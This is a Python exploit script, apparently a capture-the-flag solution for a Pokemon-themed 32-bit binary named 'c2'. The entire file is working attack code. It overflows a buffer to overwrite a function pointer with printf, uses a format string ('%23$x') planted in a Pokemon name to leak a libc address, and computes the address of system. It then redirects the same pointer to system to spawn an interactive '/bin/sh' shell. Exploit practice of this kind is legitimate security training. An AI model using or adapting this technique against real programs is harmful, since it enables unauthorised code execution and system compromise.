#!/usr/bin/env python
# coding:utf-8

from ctf import *

# context.log_level = 'debug'

LIBC_MAIN_RET = 0x00019A63

elf = ELF('./c2')
libc = ELF('./libc.so.6')

io = process('./c2')
# io = process('./c2.patch')
# io = debug('./c2.patch'); io.b(0x08049078); io.r()

def fetch_one(name='A', replace=None):
    global io
    io.sendline(1)
    io.sendline(1)
    io.sendline(2)
    io.recvuntil('What would you like to name this Pokemon')
    io.send(ljust(name, 0xE))
    if replace is not None:
        io.sendline(replace)

def overwrite_func_pointer(mon_id, pointer):
    io.sendline(5)
    io.sendline(mon_id)
    payload = cyclic(513)
    payload += p32(pointer)
    payload = ljust(payload, 0x850)
    io.send(payload)
    io.recvuntil('m sure you')

for i in xrange(4):
    fetch_one()

for i in xrange(2):
    fetch_one(replace=2)

# fetch type 1 replace type 2
io.sendline(1)
for i in xrange(4):
    io.sendline(1)
io.sendline(2)
io.send('/bin/sh;%23$x#'.ljust(0xE))
io.sendline(2)

# info leak
overwrite_func_pointer(2, elf.plt['printf'])
io.sendline(3)
io.recvline_endswith('Attack: Gust')
io.recvuntil('/bin/sh;')
main_ret_addr = int(io.recvuntil('#', True), 16)

system_addr = main_ret_addr - LIBC_MAIN_RET + libc.symbols['system']
log.info('system address: 0x%08x', system_addr)
# assert system_addr == 0xf7e44360

# control flow hijack
overwrite_func_pointer(2, system_addr)
io.sendline(3)
io.ext_interactive()
